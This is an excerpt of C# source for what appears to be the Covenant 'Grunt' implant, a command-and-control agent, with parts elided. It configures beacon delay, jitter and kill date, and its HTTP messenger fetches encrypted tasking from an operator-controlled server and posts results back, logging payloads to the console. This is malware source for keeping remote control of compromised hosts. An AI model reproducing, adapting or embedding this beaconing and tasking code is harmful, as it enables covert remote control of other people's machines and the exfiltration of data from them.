...
namespace GruntExecutor
{
    class Grunt
    {
        public static void Execute(string CovenantURI
            , string CovenantCertHash
            , string GUID, Aes SessionKey
            , List<string> ProfileHttpHeaderNames
            , List<string> ProfileHttpHeaderValues
            , List<string> ProfileHttpUrls
            , string ProfileHttpPostRequest
            , string ProfileHttpPostResponse
            , string ProfileHttpGetResponse
            , bool ValidateCert
            , bool UseCertPinning)
        {
            try
            {
                int Delay = 1; // Convert.ToInt32(@"{{REPLACE_DELAY}}");
                int Jitter = 0; // Convert.ToInt32(@"{{REPLACE_JITTER_PERCENT}}");
                int ConnectAttempts = 5000; // Convert.ToInt32(@"{{REPLACE_CONNECT_ATTEMPTS}}");
                DateTime KillDate = DateTime.Parse("Jan 1, 2050"); // DateTime.FromBinary(long.Parse(@"{{REPLACE_KILL_DATE}}"));
                ...
                var profile = new Profile(ProfileHttpGetResponse, ProfileHttpPostRequest, ProfileHttpPostResponse);
                var messageCrafter = new MessageCrafter(GUID, SessionKey);
                IMessenger baseMessenger = null;
                baseMessenger = new HttpMessenger(profile
                    , messageCrafter
                    , CovenantURI
                    , CovenantCertHash
                    , UseCertPinning
        ...
        public static void LogException(string prefix, Exception e)
        {
            if (String.IsNullOrEmpty(prefix))
                Console.Error.WriteLine(e.GetType().ToString() + " " + e.Message + Environment.NewLine + e.StackTrace);
            else
                Console.Error.WriteLine(prefix + " " + e.GetType().ToString() + " " + e.Message + Environment.NewLine + e.StackTrace);
        }

        public static void LogException(Exception e)
        {
            Grunt.LogException(null, e);
        }
    ...
    {
        private Profile Profile { get; } = null;
        private MessageCrafter MessageCrafter { get; } = null;
        public string Hostname { get; } = "";
        public string Identifier { get; set; } = "";
        public string Authenticator { get; set; } = "";
        ...
        public HttpMessenger(Profile Profile
        ...
        {
            this.Profile = Profile;
            this.MessageCrafter = MessageCrafter;
        ...
        public string Read()
        {
            ...
            lock (this._WebClientLock)
            {
                ...
                result = this.CovenantClient.DownloadString(this.CovenantURI + this.GetURL());
            }
            return result;
        }
        ...
        public void Write(string Message)
        {
            ...
            Console.WriteLine("URL:     " + this.CovenantURI + this.GetURL());
            if (!String.IsNullOrEmpty(Message))
            {
                gruntMessage = this.Profile.ParsePostRequest(Message);
                if (gruntMessage != null)
                {
                    string json = this.MessageCrafter.Retrieve(gruntMessage);
                    if (String.IsNullOrEmpty(json))
                        Console.WriteLine("Payload Request*: " + Message);
                    else
                        Console.WriteLine("Payload Request: " + json);
                }
            }
            lock (this._WebClientLock)
            {
            ...
            if (!String.IsNullOrEmpty(this.ToReadValue))
            {
                gruntMessage = this.Profile.ParsePostResponse(this.ToReadValue);
                if (gruntMessage != null)
                {
                    string json = this.MessageCrafter.Retrieve(gruntMessage);
                    Console.WriteLine("Payload Response: " + json);
                }
            }
        }
    ...
    public class GruntTaskingMessage
    {
        ...
        {
           return string.Format("<GruntTaskingMessage Type='{0}' Name='{1}' Message='{2}' Token='{3}' />", this.Type.ToString(), this.Name, this.Message, this.Token);
        }
    }
    ...
    public class GruntEncryptedMessage
    {
        ...
        public string ToString(MessageCrafter crafter)
        {
            string json = crafter.Retrieve(this);
            GruntTaskingMessage result = GruntTaskingMessage.FromJson(json);
